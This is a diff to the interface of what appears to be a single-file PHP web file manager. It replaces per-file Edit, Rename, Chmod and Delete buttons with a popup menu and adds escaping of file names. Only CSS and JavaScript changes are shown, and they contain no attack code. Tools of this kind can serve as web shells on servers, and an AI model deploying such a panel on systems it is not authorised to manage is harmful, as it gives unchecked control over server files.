         
-        .row-actions { display: flex; gap: 6px; flex-shrink: 0; overflow-x: auto; scrollbar-width: none; align-items: center; }
+        .row-actions { display: flex; gap: 6px; flex-shrink: 0; overflow-x: auto; scrollbar-width: none; align-items: center; position: relative; z-index: 2; }
         .row-actions::-webkit-scrollbar { display: none; }
         
-        /* FIX HITBOX & HOVER, Ukuran dikembalikan ke v13.13 */
         .act-btn { 
             background: rgba(255, 255, 255, 0.02); /* Hitbox fix */
             border: 1px solid var(--win-border); 
@@ -382,16 +593,27 @@ if (isset($_GET['api'])) {
         }
         
         .act-btn:hover, .act-btn:active { background: var(--accent-dim); color: #000; border-color: var(--accent); }
-        .act-btn.act-danger:hover, .act-btn.act-danger:active { background: var(--danger); color: #fff; border-color: var(--danger); }
         
         /* Ukuran SVG 13.13 + cegah block klik */
-        .act-btn svg { pointer-events: none; width: 16px; height: 16px; }
+        .act-btn svg { pointer-events: none !important; width: 16px; height: 16px; }
+
+        /* Popup Context Menu CSS */
+        .context-menu {
+            position: fixed; background: rgba(20, 22, 26, 0.98); backdrop-filter: blur(15px);
+            border: 1px solid var(--win-border); border-radius: 12px; padding: 6px; z-index: 100000;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.8); display: flex; flex-direction: column; min-width: 170px;
+        }
+        .ctx-item { padding: 12px 16px; font-size: 14px; font-weight: 500; color: var(--text-main); cursor: pointer; border-radius: 8px; transition: 0.2s; display: flex; align-items: center; gap: 12px; }
+        .ctx-item:hover, .ctx-item:active { background: rgba(255,255,255,0.08); color: #fff; }
+        .ctx-item svg { width: 16px; height: 16px; stroke-width: 2; flex-shrink: 0; pointer-events: none !important; }
+        .ctx-item.danger { color: var(--danger); }
+        .ctx-item.danger:hover, .ctx-item.danger:active { background: rgba(255, 64, 129, 0.15); }
 
         /* === MOBILE RESPONSIVE TWEAKS === */
         @media (max-width: 768px) {
             .list-row { padding: 10px 10px; gap: 5px; } /* Ukuran 13.13 */
-            .f-name { font-size: 13px; }
-            .f-meta { font-size: 10px; gap: 6px; }
+            .f-name { font-size: 14px; }
+            .f-meta { font-size: 12px; gap: 6px; }
             .act-btn { padding: 4px 6px; } /* Ukuran 13.13 */
             .act-btn svg { width: 14px; height: 14px; }
             .row-actions { gap: 4px; }
@@ -436,12 +658,12 @@ if (isset($_GET['api'])) {
         .os-btn.confirm:hover { filter: brightness(1.2); }
 
         .card-holder { position: fixed; right: 0; top: 50%; transform: translateY(-50%); z-index: 99990; display: flex; flex-direction: column; gap: 7px; pointer-events: none; }
-        .card-wrapper { display: flex; justify-content: flex-end; pointer-events: auto; }
+        .card-wrapper { display: flex; justify-content: flex-end; pointer-events: none; }
         .card-slide {
             position: relative; display: flex; align-items: center; gap: 9px; padding: 11px 16px 11px 14px;
             border-radius: 9px 0 0 9px; cursor: pointer; transform: translateX(calc(100% - 8px));
             transition: transform 0.28s ease-in-out, box-shadow 0.28s; box-shadow: -4px 0 14px rgba(0,0,0,0.55);
-            white-space: nowrap; user-select: none; -webkit-tap-highlight-color: transparent;
+            white-space: nowrap; user-select: none; -webkit-tap-highlight-color: transparent; pointer-events: auto;
         }
         .card-slide:hover, .card-slide:active { transform: translateX(0); box-shadow: -8px 0 24px rgba(0,0,0,0.75); }
         .card-slide svg { width: 15px; height: 15px; stroke: rgba(255,255,255,0.92); fill: none; stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round; flex-shrink: 0; }
@@ -466,7 +688,7 @@ if (isset($_GET['api'])) {
 
         @media (max-width: 768px) {
             .card-holder { gap: 6px; pointer-events: none; }
-            .card-wrapper { pointer-events: auto; }
+            .card-wrapper { pointer-events: none; }
             .card-slide { padding: 10px 13px 10px 11px; gap: 7px; border-radius: 9px 0 0 9px; transform: translateX(100%); transition: transform 0.32s cubic-bezier(0.34, 1.56, 0.64, 1), box-shadow 0.28s; }
             .card-slide svg { width: 13px; height: 13px; }
             .card-label { font-size: 10px; letter-spacing: 1.3px; }
@@ -507,6 +729,7 @@ if (isset($_GET['api'])) {
     <script>
         let zIndexCounter = 100;
         let currentPath = '';
+        let ctxMenu = null;
 
         function b64EncodeUnicode(str) {
             return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
@@ -514,13 +737,18 @@ if (isset($_GET['api'])) {
             }));
         }
 
-        // Ikon SVG dengan ukuran persis versi 13.13
+        const handleCloseCtx = (e) => { if (e && e.target && e.target.closest('.context-menu')) return; closeCtxMenu(); };
+        function closeCtxMenu() { if (ctxMenu) { ctxMenu.remove(); ctxMenu = null; } }
+        document.addEventListener('click', handleCloseCtx);
+        document.addEventListener('touchstart', handleCloseCtx, {passive: true});
+
         const svgEdit = '<svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" stroke-width="2" fill="none"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"></path><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>';
         const svgRename = '<svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" stroke-width="2" fill="none"><path d="M12 20h9"></path><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"></path></svg>';
         const svgChmod = '<svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" stroke-width="2" fill="none"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>';
         const svgDelete = '<svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" stroke-width="2" fill="none"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg>';
         const svgNewFolder = '<svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" stroke-width="2" fill="none"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path><line x1="12" y1="11" x2="12" y2="17"></line><line x1="9" y1="14" x2="15" y2="14"></line></svg>';
         const svgNewFile = '<svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" stroke-width="2" fill="none"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="12" y1="18" x2="12" y2="12"></line><line x1="9" y1="15" x2="15" y2="15"></line></svg>';
+        const svgMore = '<svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="5" r="1.5"></circle><circle cx="12" cy="12" r="1.5"></circle><circle cx="12" cy="19" r="1.5"></circle></svg>';
 
         const leftPaths = ["M8 20H19.5C22.5376 20 25 17.5376 25 14.5V12C25 10.3431 23.6569 9 22 9C20.3431 9 19 10.3431 19 12V14M19 14C19 17.3137 16.3137 20 13 20C9.68629 20 7 17.3137 7 14C7 10.6863 9.68629 9 13 9C16.3137 9 19 10.6863 19 14ZM17.5 4.5L21 9M22.5 3.5L23 9","M4 20H15.5C18.5376 20 21 17.5376 21 14.5V12.9737C21 12.3288 20.9423 11.6602 20.5945 11.1171C20.0688 10.2963 19.2755 10 18 10C16.3431 10 15 10.3431 15 12V14M15 14C15 17.3137 12.3137 20 9 20C5.68629 20 2.5 17.3137 2.5 14C2.5 10.6863 5.68629 9 9 9C12.3137 9 15 10.6863 15 14ZM12.5 6L17 10M16.5 4.5L19 10","M4 20H15.5C18.5376 20 21 17.5376 21 14.5V12C21 10.3431 19.6569 9 18 9C16.3431 9 15 10.3431 15 12V14M15 14C15 17.3137 12.3137 20 9 20C5.68629 20 3 17.3137 3 14C3 10.6863 5.68629 9 9 9C12.3137 9 15 10.6863 15 14ZM17 3.5V9M21 4L19 9","M3 20H15.5C18.5376 20 21 17.5376 21 14.5V12C21 10.3431 19.6569 9 18 9C16.3431 9 15 10.3431 15 12V14M15 14C15 17.3137 12.3137 20 9 20C5.68629 20 3 17.3137 3 14C3 10.6863 5.68629 8 9 8C12.3137 8 15 10.6863 15 14ZM15.5 4.5L17 9M20.5 4.5L19 9"];
         const rightPaths = ["M21.1618 12.0725C21.0324 12.2462 20.8964 12.4091 20.6947 12.4906C19.8889 12.8161 17.72 12.7592 18.1576 14.4568C20.4274 15.7829 18.7648 19.057 17.312 19.6509C14.5299 20.7884 15.2668 16.2734 12.558 16.6605C10.2266 16.9937 8.25785 22.0029 5.92645 21.1221C3.11203 20.0589 7.03795 16.2052 3.80815 15.0326C0.15683 13.9675 2.89493 9.94939 5.98043 12.2436C6.17283 12.0692 7.37001 10.5381 9.67966 9.76257C12.072 8.95926 13.6526 9.29784 13.6509 9.28399C13.0759 8.07151 10.3146 6.76186 10.2522 5.06943C10.2291 4.44247 10.8734 4.06837 11.4987 4.01715C14.1054 3.80361 16.496 4.09566 17.1154 5.96899C19.9542 5.62044 23.1405 9.41662 21.1618 12.0725Z","M21.1777 11.3703C21.0607 11.5526 20.9365 11.7246 20.7409 11.8199C19.9598 12.2008 18.4008 11.9811 18.9557 13.644C21.3124 14.8086 23.9451 17.671 22.5373 18.3648C19.8413 19.6936 15.5901 15.9721 12.9149 16.5473C10.6125 17.0423 5.90925 21.4348 3.52209 20.7189C0.640352 19.8546 7.37655 16.4781 4.07283 15.5336C0.356106 14.7259 2.80724 10.5266 6.04526 12.5999C6.22503 12.4125 7.31249 10.8017 9.56242 9.86692C11.8929 8.89869 13.4933 9.12618 13.4906 9.11248C12.8306 7.93976 9.18504 6.60733 8.78419 4.85079C8.6446 4.23913 9.26919 3.80341 9.89169 3.72521C12.6765 3.3754 15.9636 3.73045 16.7155 5.56389C19.523 5.01816 22.9663 8.58284 21.1777 11.3703Z","M20.9725 13.8838C20.8098 14.0268 20.6429 14.1579 20.4287 14.1956C19.5728 14.3464 18.1348 13.7055 18.2098 15.4569C20.1543 17.226 21.8959 20.7032 20.3515 20.9821C17.3937 21.5163 14.3329 16.7672 11.6028 16.5827C9.25311 16.4239 5.7761 19.0402 3.67875 17.694C1.14688 16.0689 7.28575 15.146 4.37033 13.3275C1.02023 11.5266 4.53391 8.16558 7.07499 11.0512C7.29946 10.9205 7.80111 9.51543 10.2215 9.23703C12.7286 8.94867 14.2043 9.60848 14.2055 9.59458C13.8943 8.28534 10.7572 5.99969 10.8561 4.20071C10.8905 3.57426 11.611 3.32758 12.2309 3.424C15.0043 3.85533 18.0662 5.10268 18.2836 7.07233C21.1327 7.3216 23.4601 11.6973 20.9725 13.8838Z","M21.115 13.1921C20.9654 13.3487 20.8106 13.4938 20.6005 13.5501C19.761 13.7749 17.6152 13.4542 17.8427 15.1924C19.9339 16.7853 20.8847 19.8323 19.3704 20.2448C16.4704 21.0348 14.7521 16.6432 12.0163 16.6973C9.66163 16.7439 7.09707 21.4758 4.89038 20.3175C2.22651 18.9192 6.59282 15.5726 3.53001 14.0151C0.0356922 12.5131 3.24307 8.85857 6.02598 11.5117C6.2382 11.362 7.61304 9.98829 10 9.5C12.4724 8.99423 14 9.52291 14 9.50896C13.5713 8.2183 11.6644 5.81661 12.0937 3.89732C12.2306 3.28506 12.8811 2.98279 13.504 3.05766C15.922 3.34828 17.4579 4.71479 17.8427 6.64088C20.7027 6.64088 23.4026 10.7971 21.115 13.1921Z"];
@@ -644,6 +872,41 @@ if (isset($_GET['api'])) {
             });
         }
 
+        function showActionMenu(e, filename, type) {
+            closeCtxMenu();
+            ctxMenu = document.createElement('div'); ctxMenu.className = 'context-menu'; ctxMenu.style.visibility = 'hidden'; 
+            const rect = e.currentTarget.getBoundingClientRect();
+            
+            let menuHtml = '';
+            if (type === 'dir') {
+                menuHtml = `
+                    <div class="ctx-item" onclick="closeCtxMenu(); apiPrompt('Rename', '${filename}', (v) => apiRename('${filename}', v))">${svgRename} Rename</div>
+                    <div class="ctx-item danger" onclick="closeCtxMenu(); if(confirm('Delete ${filename}?')) apiDelete('${filename}')">${svgDelete} Delete</div>`;
+            } else {
+                menuHtml = `
+                    <div class="ctx-item" onclick="closeCtxMenu(); apiReadAndEdit('${filename}')">${svgEdit} Edit File</div>
+                    <div class="ctx-item" onclick="closeCtxMenu(); apiPrompt('Rename', '${filename}', (v) => apiRename('${filename}', v))">${svgRename} Rename</div>
+                    <div class="ctx-item" onclick="closeCtxMenu(); apiPrompt('Chmod', '0755', (v) => apiChmod('${filename}', v))">${svgChmod} Chmod</div>
+                    <div class="ctx-item danger" onclick="closeCtxMenu(); if(confirm('Delete ${filename}?')) apiDelete('${filename}')">${svgDelete} Delete</div>`;
+            }
+            
+            ctxMenu.innerHTML = menuHtml;
+            document.body.appendChild(ctxMenu);
+            
+            const menuRect = ctxMenu.getBoundingClientRect();
+            let leftPos = rect.right - menuRect.width;
+            let topPos = rect.bottom + 5;
+            
+            if (topPos + menuRect.height > window.innerHeight) {
+                topPos = rect.top - menuRect.height - 5;
+            }
+            if (leftPos < 10) leftPos = 10;
+            
+            ctxMenu.style.left = leftPos + 'px'; 
+            ctxMenu.style.top = topPos + 'px'; 
+            ctxMenu.style.visibility = 'visible';
+        }
+
         async function fetchFileSystem(pathTarget) {
             const fsView = document.getElementById('fs-view'); const expHeader = document.getElementById('exp-header');
             if (!fsView) return; if (expHeader) expHeader.style.display = 'none';
@@ -658,21 +921,21 @@ if (isset($_GET['api'])) {
                     currentPath = json.data.path; renderBreadcrumbs(currentPath); fsView.innerHTML = '';
                     json.data.items.forEach(item => {
                         const row = document.createElement('div'); row.className = `list-row ${item.type}`;
-                        const permColor = item.permit ? 'var(--success)' : 'var(--danger)'; let metaHtml = ''; let actionsHtml = '';
+                        const permColor = item.permit ? 'var(--success)' : 'var(--danger)'; 
+                        let metaHtml = ''; let actionsHtml = '';
+
+                        const jsName = item.name.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '&quot;').replace(/\n/g, '\\n').replace(/\r/g, '\\r');
+                        const htmlName = item.name.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
 
                         if (item.name === '..') {
                             metaHtml = `<div class="f-meta">Go up to parent directory</div>`;
                             actionsHtml = `<div class="row-actions"><button class="act-btn" onclick="event.stopPropagation(); apiPrompt('New Folder', 'folder_name', apiMkdir)" title="New Folder">${svgNewFolder}</button><button class="act-btn" onclick="event.stopPropagation(); apiPrompt('New File', 'filename.txt', apiTouch)" title="New File">${svgNewFile}</button></div>`;
-                            row.innerHTML = `<div class="f-main"><div class="f-icon">${getSvg(item.type, item.ext)}</div><div class="f-info"><div class="f-name">${item.name}</div>${metaHtml}</div></div>${actionsHtml}`;
                         } else {
                             metaHtml = `<div class="f-meta"><span>${item.size}</span> <span class="dot"></span><span style="color: ${permColor}; font-weight: 600;">${item.perms}</span> <span class="dot"></span><span>${item.mtime}</span></div>`;
-                            if (item.type === 'dir') {
-                                actionsHtml = `<div class="row-actions"><button class="act-btn" onclick="event.stopPropagation(); apiPrompt('Rename', '${item.name}', (v) => apiRename('${item.name}', v))" title="Rename">${svgRename}</button><button class="act-btn act-danger" onclick="event.stopPropagation(); if(confirm('Delete ${item.name}?')) apiDelete('${item.name}')" title="Delete" style="color: var(--danger); border-color: rgba(255, 64, 129, 0.3);">${svgDelete}</button></div>`;
-                            } else {
-                                actionsHtml = `<div class="row-actions"><button class="act-btn" onclick="event.stopPropagation(); apiReadAndEdit('${item.name}')" title="Edit">${svgEdit}</button><button class="act-btn" onclick="event.stopPropagation(); apiPrompt('Rename', '${item.name}', (v) => apiRename('${item.name}', v))" title="Rename">${svgRename}</button><button class="act-btn" onclick="event.stopPropagation(); apiPrompt('Chmod', '0755', (v) => apiChmod('${item.name}', v))" title="Chmod">${svgChmod}</button><button class="act-btn act-danger" onclick="event.stopPropagation(); if(confirm('Delete ${item.name}?')) apiDelete('${item.name}')" title="Delete" style="color: var(--danger); border-color: rgba(255, 64, 129, 0.3);">${svgDelete}</button></div>`;
-                            }
-                            row.innerHTML = `<div class="f-main"><div class="f-icon">${getSvg(item.type, item.ext)}</div><div class="f-info"><div class="f-name">${item.name}</div>${metaHtml}</div></div>${actionsHtml}`;
+                            actionsHtml = `<div class="row-actions"><button class="act-btn" onclick="event.stopPropagation(); showActionMenu(event, '${jsName}', '${item.type}')" title="Options">${svgMore}</button></div>`;
                         }
+                        
+                        row.innerHTML = `<div class="f-main"><div class="f-icon">${getSvg(item.type, item.ext)}</div><div class="f-info"><div class="f-name">${htmlName}</div>${metaHtml}</div></div>${actionsHtml}`;
                         if (item.type === 'dir') { row.addEventListener('click', (e) => { e.stopPropagation(); let newPath = currentPath + '/' + item.name; if (item.name === '..') newPath = currentPath.split('/').slice(0, -1).join('/'); fetchFileSystem(newPath); }); }
                         fsView.appendChild(row);
                     });
